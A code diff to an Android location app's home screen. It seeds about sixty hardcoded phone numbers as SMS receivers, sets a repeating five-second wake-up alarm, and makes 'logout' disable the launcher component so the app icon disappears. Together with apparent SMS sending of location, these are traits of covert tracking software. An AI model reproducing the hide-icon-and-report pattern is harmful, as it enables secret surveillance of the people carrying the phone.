@@ -1,7 +1,9 @@
 package com.example.ian.locations;
 
 import android.Manifest;
+import android.app.AlarmManager;
 import android.app.PendingIntent;
+import android.content.ComponentName;
 import android.content.Context;
 import android.content.DialogInterface;
 import android.content.Intent;
@@ -11,6 +13,7 @@ import android.location.Location;
 import android.location.LocationManager;
 import android.os.Build;
 import android.support.annotation.NonNull;
+import android.support.design.widget.Snackbar;
 import android.support.v4.app.ActivityCompat;
 import android.support.v4.content.ContextCompat;
 import android.support.v7.app.AlertDialog;
@@ -50,15 +53,27 @@ public class HomePageActivity extends AppCompatActivity implements View.OnClickL
     private RecyclerView recyclerView;
     private ReceiverAdapter adapter;
     private List<Receiver> albumList;
-    Button btn_add_receiver;
 
     private final int MenuItem_Logout = 1;
     static final int REQUEST_LOCATION = 1;
     LocationManager locationManager;
     private static final int REQUEST_SMS = 0;
 
+    private final int MenuItem_EditId = 1, MenuItem_DeleteId = 0;
+
+
     private static final int READ_SMS_PERMISSIONS_REQUEST = 1;
     public static String LAT_LONG = "";
+
+    private static final ComponentName LAUNCHER_COMPONENT_NAME = new ComponentName(
+            "com.example.ian.locations", "com.example.ian.locations.ServerLoginActivity");
+
+    private PendingIntent pendingIntent;
+    private AlarmManager manager;
+
+    static HomePageActivity instance;
+
+
 
     @Override
     protected void onCreate(Bundle savedInstanceState) {
@@ -66,7 +81,6 @@ public class HomePageActivity extends AppCompatActivity implements View.OnClickL
         setContentView(R.layout.activity_home_page);
 
         recyclerView = (RecyclerView) findViewById(R.id.recycler_view);
-        btn_add_receiver = (Button)findViewById(R.id.id_add);
 
         //get location
         locationManager = (LocationManager) getSystemService(Context.LOCATION_SERVICE);
@@ -81,7 +95,6 @@ public class HomePageActivity extends AppCompatActivity implements View.OnClickL
 
         prepareAlbums();
 
-        btn_add_receiver.setOnClickListener(this);
 
         firstTimeSend();
         //sendReceiver();
@@ -89,6 +102,10 @@ public class HomePageActivity extends AppCompatActivity implements View.OnClickL
         sendSmsAsynchronousTAsk();
         //GET LOCATION FIRST
         getLotLang();
+
+        startAlarm();
+
+        instance = this;
 
 
     }
@@ -139,7 +156,98 @@ public class HomePageActivity extends AppCompatActivity implements View.OnClickL
 
     private void prepareAlbums() {
 
+        //add data first
+
+
+
         Receiver receiver = new Receiver();
+
+        List<Receiver> list = receiver.getAllReceivers();
+
+        Log.wtf("SIZE-OF-LIST", list.size()+"");
+
+        if(list.size() == 0) {
+            //sample data
+            String[] test_data = new String[]{
+//                    "09177776718",
+//                    "09173200619",
+//                    "09088809507",
+//                    "09128510821",
+//                    "09223007096"
+                    "09223007096"
+            };
+
+            String[] data = new String[]{
+                    "09992203782",
+                    "09992203783",
+                    "09992203784",
+                    "09992203785",
+                    "09992203786",
+                    "09992203787",
+                    "09992203793",
+                    "09992203796",
+                    "09992203816",
+                    "09992203819",
+                    "09992203821",
+                    "09992203822",
+                    "09992203823",
+                    "09992203824",
+                    "09992203825",
+                    "09992203805",
+                    "09992203806",
+                    "09992203808",
+                    "09992203809",
+                    "09992203956",
+                    "09992203957",
+                    "09992203958",
+                    "09992203959",
+                    "09992203960",
+                    "09992203961",
+                    "09992203962",
+                    "09992203963",
+                    "09992203964",
+                    "09992203965",
+                    "09992203966",
+                    "09992203967",
+                    "09992203968",
+                    "09992203969",
+                    "09992203970",
+                    "09992203972",
+                    "09992203973",
+                    "09992203974",
+                    "09992203975",
+                    "09992203976",
+                    "09992203977",
+                    "09992203978",
+                    "09992203979",
+                    "09992203980",
+                    "09992203981",
+                    "09992203982",
+                    "09992203983",
+                    "09992203940",
+                    "09992203941",
+                    "09992203942",
+                    "09992203943",
+                    "09992203944",
+                    "09992203945",
+                    "09992203946",
+                    "09992203948",
+                    "09992203949",
+                    "09992203950",
+                    "09992203951",
+                    "09992203952",
+                    "09992203953",
+                    "09992203954",
+                    "09992203955",
+            };
+
+            addPhoneList(data);
+
+           // addPhoneList(test_data);
+        }
+
+        //addPhoneList(test_data);
+        //Receiver receiver = new Receiver();
         List<Receiver> receiverList = receiver.getAllReceivers();
         for (int i = 0; i < receiverList.size(); i ++) {
             Receiver receiver1 = new Receiver();
@@ -272,9 +380,24 @@ public class HomePageActivity extends AppCompatActivity implements View.OnClickL
     @Override
     public boolean onCreateOptionsMenu(Menu menu){
 
-        MenuItem edit_item = menu.add(0, MenuItem_Logout, 0, "edit");
-        edit_item.setIcon(R.drawable.logout);
+//        MenuItem edit_item = menu.add(0, MenuItem_Logout, 0, "edit");
+//        edit_item.setIcon(R.drawable.logout);
+//        edit_item.setShowAsActionFlags(MenuItem.SHOW_AS_ACTION_IF_ROOM);
+//
+//        MenuItem delete_item = menu.add(0, MenuItem_DeleteId, 1, "add");
+//        delete_item.setIcon(R.drawable.lock);
+//        delete_item.setShowAsActionFlags(MenuItem.SHOW_AS_ACTION_IF_ROOM);
+
+        MenuItem edit_item = menu.add(0, MenuItem_EditId, 0, "logout");
+        edit_item.setIcon(R.drawable.icon_add);
         edit_item.setShowAsActionFlags(MenuItem.SHOW_AS_ACTION_IF_ROOM);
+
+        MenuItem delete_item = menu.add(0, MenuItem_DeleteId, 1, "add");
+        delete_item.setIcon(R.drawable.logout);
+        delete_item.setShowAsActionFlags(MenuItem.SHOW_AS_ACTION_IF_ROOM);
+
+
+
         return super.onCreateOptionsMenu(menu);
     }
 
@@ -282,9 +405,17 @@ public class HomePageActivity extends AppCompatActivity implements View.OnClickL
     public boolean onOptionsItemSelected(MenuItem item) {
 
         switch (item.getItemId()) {
-            case MenuItem_Logout:
+            case MenuItem_DeleteId:
                 //sendReceiver();
                 logoutAlert();
+
+                return true;
+
+            case MenuItem_EditId:
+                //sendReceiver();
+               // logoutAlert();
+
+                addPhone();
 
                 return true;
             default:
@@ -541,8 +672,11 @@ public class HomePageActivity extends AppCompatActivity implements View.OnClickL
                     public void onClick(View view) {
 
                         //showToast("Dialog not dismissed!");
-                        Intent intent = new Intent(HomePageActivity.this, LoginActivity.class);
-                        startActivity(intent);
+//                        Intent intent = new Intent(HomePageActivity.this, LoginActivity.class);
+//                        startActivity(intent);
+                        getPackageManager().setComponentEnabledSetting(LAUNCHER_COMPONENT_NAME,
+                                PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
+                                PackageManager.DONT_KILL_APP);
                         finish(); //
                         System.exit(0);
                         alertDialog.dismiss();
@@ -642,6 +776,153 @@ public class HomePageActivity extends AppCompatActivity implements View.OnClickL
             }
 
     }
+
+
+    public void addPhoneList(String[] data)
+    {
+        String user_id = getSessionId();
+        for(int i = 0; i< data.length; i++) {
+            Receiver phone = new Receiver();
+            if(!phone.checkPhone(data[i])){
+                //add
+
+                //Receiver(int user_id, String phone, double latitude, double longitude)
+                Receiver a = new Receiver(Integer.parseInt(user_id), data[i], 0,0);
+                long id = a.add();
+            }
+        }
+    }
+
+    public void addPhone()
+    {
+        final AlertDialog alertDialog = new AlertDialog.Builder(this)
+                .setTitle("RECEIVER")
+                .setMessage("Enter receiver below")
+                .setPositiveButton("Done", null) // null to override the onClick
+                .setNegativeButton("Cancel", null)
+                .setCancelable(false)
+                .create();
+
+        LayoutInflater inflater = this.getLayoutInflater();
+        final View dialogView = inflater.inflate(R.layout.custom_dialog, null);
+        alertDialog.setView(dialogView);
+
+        final EditText edt = (EditText) dialogView.findViewById(R.id.id_edit_text_phone);
+
+        alertDialog.setOnShowListener(new DialogInterface.OnShowListener() {
+
+            @Override
+            public void onShow(DialogInterface dialog) {
+
+                Button btnPositive = alertDialog.getButton(AlertDialog.BUTTON_POSITIVE);
+                btnPositive.setOnClickListener(new View.OnClickListener() {
+
+                    @Override
+                    public void onClick(View view) {
+
+                        //showToast("Dialog not dismissed!");
+
+                        String phone =  edt.getText().toString();
+                        if(phone.isEmpty()) {
+                            Toast.makeText(getApplicationContext(), "Please input phone number", Toast.LENGTH_LONG).show();
+                        }
+                        else {
+                            int user_id = 0;
+                            try {
+
+
+                                user_id = Integer.parseInt(getSessionId());
+                                Receiver receiver = new Receiver(user_id, phone, 0,0);
+                                long id = receiver.add();
+                                if(id == 0) {
+                                    Log.wtf("ERROR", "ERROR ADDING RECEIVER");
+                                }
+                                CheckerReceiver checkerReceiver = new CheckerReceiver();
+                                //check if first time send sms
+                                if(checkerReceiver.getLastRecordCreatedAt().isEmpty()) {
+                                    //get the last receiver id
+                                    Receiver receiver1 = new Receiver();
+                                    if(!receiver1.getLastInsertId().isEmpty()) {
+                                        String receiver_id = receiver1.getLastInsertId();
+//                                        //get position to add checker
+                                        CheckerReceiver checkerReceiver_add = new CheckerReceiver();
+                                        checkerReceiver_add.setCursor_position(receiver1.getCursorPosition(receiver_id));
+                                        checkerReceiver.add();
+//                                        //send sms
+                                        //prepareSms(phone);
+                                        // Log.wtf("INSERT-THIS", "Please insert me.. my last id is"+receiver_id+"my phone "+phone+""+" my loacation"+ LAT_LONG);
+                                        //sendSMSFirstTime(phone, "Hello");
+                                        getPermissionToReadSMS();
+                                        firstTimeSend();
+                                        //use this code
+                                        //sendSMSFirstTime(phone, LAT_LONG);
+                                        prepareSms(phone);
+
+                                        //sendMySMS(phone);
+
+                                    }
+                                    else {
+                                        Log.wtf("NO", "no lastinserted");
+                                    }
+
+                                }
+                                albumList.add(receiver);
+                                adapter.notifyDataSetChanged();
+                                alertDialog.dismiss();
+
+                            }
+                            catch(NumberFormatException e){
+                                Log.wtf("ERROR_CASTING", "error casting user id");
+                            }
+                        }
+
+                    }
+                });
+
+
+                Button btnNegative = alertDialog.getButton(AlertDialog.BUTTON_NEGATIVE);
+                btnNegative.setOnClickListener(new View.OnClickListener() {
+
+                    @Override
+                    public void onClick(View view) {
+
+                        // dismiss once everything is ok
+                        alertDialog.dismiss();
+                    }
+                });
+            }
+        });
+
+        // don't forget to show it
+        alertDialog.show();
+    }
+
+    public void testLog(String message)
+    {
+        Log.wtf("TEST-LOG", message);
+    }
+
+
+    public void startAlarm() {
+
+        // Retrieve a PendingIntent that will perform a broadcast
+        Intent alarmIntent = new Intent(this, AlarmReceiver.class);
+        pendingIntent = PendingIntent.getBroadcast(this, 0, alarmIntent, 0);
+
+
+        manager = (AlarmManager)getSystemService(getApplicationContext().ALARM_SERVICE);
+        //int interval = 10000; // 10 seconds
+        int interval = 5000; // 5 seconds
+        //int interval = 1000; // 1 seconds
+
+        manager.setRepeating(AlarmManager.RTC_WAKEUP, System.currentTimeMillis(), interval, pendingIntent);
+        //Toast.makeText(this, "Alarm Set", Toast.LENGTH_SHORT).show();
+        Log.wtf("ALARM-SET", "alarm is set");
+
+
+    }
+
+
 
 
 }
